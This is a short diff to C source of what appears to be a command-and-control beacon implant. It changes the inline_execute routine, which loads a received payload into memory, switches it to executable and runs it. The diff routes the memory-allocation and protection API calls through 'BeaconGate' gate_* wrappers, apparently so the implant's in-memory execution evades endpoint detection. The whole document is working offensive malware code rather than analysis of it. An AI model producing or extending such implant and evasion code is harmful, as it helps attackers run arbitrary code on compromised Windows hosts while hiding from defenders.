@@ -1,4 +1,5 @@
 #include <Windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <stdio.h>
 #include "commands.h"
 #include "beacon.h"
@@ -52,7 +53,7 @@ BOOL inline_execute(char * payload, DWORD plength, char * arg, DWORD alength) {
 	foo.alen             = alength;
 
 	/* init and copy over to it (RW -> copy -> RX: never RWX) */
-	execpatch = (char *)VirtualAlloc(NULL, plength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	execpatch = (char *)gate_VirtualAlloc(NULL, plength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (execpatch == NULL)
 		return FALSE;
 
@@ -65,8 +66,8 @@ BOOL inline_execute(char * payload, DWORD plength, char * arg, DWORD alength) {
 	/* code is complete: drop to RX before we execute it */
 	{
 		DWORD old = 0;
-		if (!VirtualProtect(execpatch, plength, PAGE_EXECUTE_READ, &old)) {
-			VirtualFree(execpatch, plength, MEM_RELEASE);
+		if (!gate_VirtualProtect(execpatch, plength, PAGE_EXECUTE_READ, &old)) {
+			gate_VirtualFree(execpatch, plength, MEM_RELEASE);
 			return FALSE;
 		}
 		FlushInstructionCache(GetCurrentProcess(), execpatch, plength);
@@ -76,7 +77,7 @@ BOOL inline_execute(char * payload, DWORD plength, char * arg, DWORD alength) {
 	inlinefunc(&foo);
 
 	/* OK, cleanup! */
-	VirtualFree(execpatch, plength, MEM_RELEASE);
+	gate_VirtualFree(execpatch, plength, MEM_RELEASE);
 
 	return foo.result;
 }
